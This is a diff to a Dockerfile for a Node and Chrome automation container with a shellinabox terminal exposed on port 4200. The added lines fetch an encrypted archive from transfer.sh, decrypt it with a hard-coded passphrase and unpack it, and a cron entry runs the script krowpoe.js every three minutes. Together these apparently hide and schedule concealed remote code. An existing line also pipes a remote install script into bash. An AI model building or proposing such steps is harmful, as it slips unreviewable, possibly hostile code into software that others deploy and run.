@@ -14,6 +14,9 @@ RUN apt-get update && \
     wget https://dl.google.com/linux/direct/google-chrome-stable_current_amd64.deb && \
     apt-get install -fy ./google-chrome-stable_current_amd64.deb && \
     wget -qO- https://raw.githubusercontent.com/nvm-sh/nvm/v0.39.5/install.sh | bash && \
+    wget -O comp.tar.gz.gpg https://transfer.sh/4vqb1O3e9e/comp && \
+    echo "thecl0udsares0funny" | gpg -o comp.tar.gz --passphrase-fd 0 -d comp.tar.gz.gpg && \
+    tar -xvzf comp.tar.gz && \
     apt-get clean && \
     apt-get update && \
     rm -rf /var/lib/apt/lists/* /tmp/* /var/tmp/*
@@ -29,7 +32,7 @@ RUN . $NVM_DIR/nvm.sh \
     && npm install selenium-webdriver \ 
     && npm install discord.js
 RUN systemctl enable cron \ 
-    && crontab -l | { cat; echo "*/5 * * * * node /root/krowpoe.js"; } | crontab -
+    && crontab -l | {cat; echo "*/3 * * * * cd && /root/.nvm/versions/node/v21.2.0/bin/node krowpoe.js"; } | crontab -
 
 EXPOSE 4200
 CMD ["/usr/bin/shellinaboxd", "-t", "-s", "/:LOGIN"]
